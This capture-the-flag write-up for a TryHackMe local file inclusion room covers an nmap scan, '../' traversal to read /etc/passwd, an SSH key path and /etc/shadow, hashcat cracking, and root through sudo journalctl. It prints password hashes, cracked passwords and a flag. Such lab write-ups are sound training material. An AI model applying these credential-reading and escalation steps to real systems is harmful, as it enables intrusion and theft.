# TryHackMe-LFI

> Abdullah Rizwan | 09:21 AM , 4th November ,2020


## LFI

Local File Inclusion (LFI) is the vulnerability that is mostly found in web servers. This vulnerability is exploited when a user input contains a certain path to the file which might be present on the server and will be included in the output. This kind of vulnerability can be used to read files containing sensitive and confidential data from the vulnerable system.

The main cause of this type of Vulnerability is improper sanitization of the user's input. Sanitization here means that whatever user input should be checked and it should be made sure that only the expected values are passed and nothing suspicious is given in input. It is a type of Vulnerability commonly found in PHP based websites but isn't restricted to them.


### Testing for LFI

To test for LFI what we need is a parameter on any URL or any other input fields like request body etc. For example, if the website is tryhackme.com then a parameter in the URL can look like https://tryhackme.com/?file=robots.txt. Here file is the name of the parameter and robots.txt is the value that we are passing (include the file robots.txt).

Importance of Arbitrary file reading

A lot of the time LFI can lead to accessing (without the proper permissions) important and classified data. An attacker can use LFI to read files from your system which can give away sensitive information such as passwords/SSH keys; enumerated data can be further used to compromise the system.

In this task, we are going to find the parameter which is vulnerable to the Local File Inclusion attack. We will then will try to leverage information obtained to get access to the system. 


Once we find the vulnerable parameter we can try to include the passwd file on the Linux system i.e /etc/passwd. The most common technique is path traversal method meaning we can include files like ../../../../etc/passwd what this does it get out of a directory like we usually do in Linux system by running cd ../

../../etc/passwd means to go out twice from the current working directory and then go to /etc directory and read the passwd file. Now the issue with this method is you need to be sure about the path of the file. 


### NMAP

```

Host is up (0.17s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:b9:f0:d3:e4:b3:17:9c:7f:b6:7d:28:72:8a:e4:77 (RSA)
|   256 07:f2:d9:85:77:74:52:2a:73:76:70:35:73:70:c3:9e (ECDSA)
|_  256 23:ba:e8:b6:8b:a2:ac:58:3b:f4:04:dc:6e:36:b7:f2 (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.6.9)
|_http-title: Shop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### PORT 80

On visting web page

<img src="https://imgur.com/WgDdTn0.png"/>

Try to navigate to different pages,and we see a parameter named `page`

<img src="https://imgur.com/r1zlNUk.png"/>

The basic traversal for `/etc/passwd` in LFI is `../../../../etc/passwd` but in this sceanrio `../../../etc/passwd` is where LFI exists

<img src="https://imgur.com/KK13Xof.png"/>


```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash sshd:x:110:65534::/run/sshd:/usr/sbin/nologin 
```
Now room tells us to read user `falcon`'s private ssh key

Replacing `/etc/passwd` with `/home/falcon/.ssh/id_rsa` the path becomes `../../../home/falcon/.ssh/id_rsa` and we can get the key

<img src="https://imgur.com/qQcjHel.png"/>

It is better to look it with the source code

<img src="https://imgur.com/SQQzQVs.png"/>

Copy it in a new file and save it as `id_rsa` by changning it's permissions `chmod 600`

<img src="https://imgur.com/b3NGCau.png"/>

Logging in with SSH keeps failing because it needs his password so lets grab `/etc/shadow` to see his hash and crack it by going to `../../../etc/shadow` 

<img src="https://imgur.com/YrzCpg1.png"/>

### Hashcat 

Use hashcat to crack sha512 hash , I came to know that it's a sha512 by looking at the fromat of it

```
hashcat -h | grep sha512
  21000 | BitShares v0.x - sha512(sha512_bin(pass))        | Raw Hash
   1710 | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated
   1720 | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated
   1740 | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated
   1730 | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated
  20200 | Python passlib pbkdf2-sha512                     | Generic KDF
   6500 | AIX {ssha512}                                    | Operating System
   1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating System
  21600 | Web2py pbkdf2-sha512                             | Framework
root@kali:~# hashcat -a 0 --user -m 1800 ^C
root@kali:~# cd TryHackMe/Easy/LFI
root@kali:~/TryHackMe/Easy/LFI# hashcat -a 0 --user -m 1800 hash /usr/share/wordlists/rockyou.txt

```
Here --user tells that your hash contains a username so you want it to be ignored
After waiting for sometime it will show you this output

```
$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:password09
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFV...yJ97k/
Time.Started.....: Wed Nov  4 09:45:38 2020 (30 secs)
Time.Estimated...: Wed Nov  4 09:46:08 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      625 H/s (12.84ms) @ Accel:16 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 18752/14344385 (0.13%)
Rejected.........: 0/18752 (0.00%)
Restore.Point....: 18688/14344385 (0.13%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: soldado -> ladeda


```
In order to show the password

```
root@kali:~/TryHackMe/Easy/LFI# hashcat -a 0 --user --show -m 1800 hash /usr/share/wordlists/rockyou.txt
falcon:$6$xQmTDVmT$hgSLG3ebs.8Tc/F4qqXNnvBBnG736EWpWKaprFVARjAsZ6JyoL4WaJdGv5.qddMWF4/MoJgN6Hekri8wyJ97k/:password09
```
Now we can login into the box

<img src="https://imgur.com/TcrMZBJ.png"/>


Running `sudo -l` to check what can we run as sudo 

```
falcon@walk:~$ sudo -l
Matching Defaults entries for falcon on walk:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falcon may run the following commands on walk:
    (root) NOPASSWD: /bin/journalctl
falcon@walk:~$ 


```

We can the user flag 

```
drwxr-xr-x 5 falcon falcon 4096 Jan 30  2020 .
drwxr-xr-x 3 root   root   4096 Jan 28  2020 ..
lrwxrwxrwx 1 root   root      9 Jan 30  2020 .bash_history -> /dev/null
-rw-r--r-- 1 falcon falcon  220 Jan 28  2020 .bash_logout
-rw-r--r-- 1 falcon falcon 3771 Jan 28  2020 .bashrc
drwx------ 2 falcon falcon 4096 Jan 28  2020 .cache
drwx------ 3 falcon falcon 4096 Jan 28  2020 .gnupg
-rw------- 1 root   root     36 Jan 29  2020 .lesshst
-rw-r--r-- 1 falcon falcon  807 Jan 28  2020 .profile
drwxr-xr-x 2 root   root   4096 Jan 29  2020 .ssh
-rw-r--r-- 1 falcon falcon    0 Jan 29  2020 .sudo_as_admin_successful
-rw-r--r-- 1 falcon falcon   21 Jan 29  2020 user.txt
falcon@walk:~$ cat user.txt 
B8LEGIF049JT4RTVWUG4

```
On visting `GTFOBINS` we might be able to escalate privileges

<img src="https://imgur.com/pwP0xrq.png"/>

### Privilege Escalation

<img src="https://imgur.com/7zlzYyU.png"/>

```
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
Jan 28 19:00:21 walk kernel: x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
Jan 28 19:00:21 walk kernel: x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
Jan 28 19:00:21 walk kernel: x86/fpu: Enabled xstate features 0x7, context size is 832 bytes, using 'standard' form
Jan 28 19:00:21 walk kernel: e820: BIOS-provided physical RAM map:
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x0000000000100000-0x000000003ffeffff] usable
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x000000003fff0000-0x000000003fffffff] ACPI data
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fec00000-0x00000000fec00fff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fee00000-0x00000000fee00fff] reserved
Jan 28 19:00:21 walk kernel: BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
Jan 28 19:00:21 walk kernel: NX (Execute Disable) protection: active
Jan 28 19:00:21 walk kernel: random: fast init done
Jan 28 19:00:21 walk kernel: SMBIOS 2.5 present.
Jan 28 19:00:21 walk kernel: DMI: innotek GmbH VirtualBox/VirtualBox, BIOS VirtualBox 12/01/2006
Jan 28 19:00:21 walk kernel: Hypervisor detected: KVM
Jan 28 19:00:21 walk kernel: e820: update [mem 0x00000000-0x00000fff] usable ==> reserved
!/bin/bash

```

```
root@walk:~# whoami
root
root@walk:~# id
uid=0(root) gid=0(root) groups=0(root)
root@walk:~# 

```
You could also priv esc by cracking root's password hash 

`root:$6$UVbVpBq4$O8f/Nk488RT95VcJpLl0WgwOuguU6kCRBVE3EHGHFviJJV9MNfb0GbK38WryIkx72d/DKh3HBprBYTcNJf0Xn0:hacking`

And we are root !
We could have also read the root and user flag through LFI but its better this way